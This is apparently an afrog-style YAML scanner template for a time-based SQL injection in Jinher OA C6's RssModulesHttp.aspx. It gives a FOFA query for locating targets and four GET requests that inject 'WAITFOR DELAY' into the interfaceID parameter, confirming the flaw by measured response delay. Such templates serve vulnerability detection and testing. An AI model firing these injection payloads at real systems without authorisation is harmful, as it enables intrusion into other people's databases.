id: jinher-c6-rssmoduleshttp-sqli

info:
  name: 金和OA RssModulesHttp.aspx接口SQL注入
  author: zan8in
  severity: high
  verified: true
  description: |-
    fofa: app="金和网络-金和OA" && body="/c6/"
  reference:
    - https://mp.weixin.qq.com/s/RM0gZfnSs4hsGa6MerqDog
  tags: jinher,sqli
  created: 2024/02/21

rules:
  r0:
    request:
      method: GET
      path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:10%27--
    expression: response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
  r1:
    request:
      method: GET
      path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:6%27--
    expression: response.status == 200 && response.latency <= 8000 &&  response.latency >= 6000
  r2:
    request:
      method: GET
      path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:10%27--
    expression: response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
  r3:
    request:
      method: GET
      path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:6%27--
    expression: response.status == 200 && response.latency <= 8000 &&  response.latency >= 6000
extractors:
  - type: word
    extractor:
      latency1: "6s"
      latency2: "10s"
expression: r0() && r1() && r2() && r3()
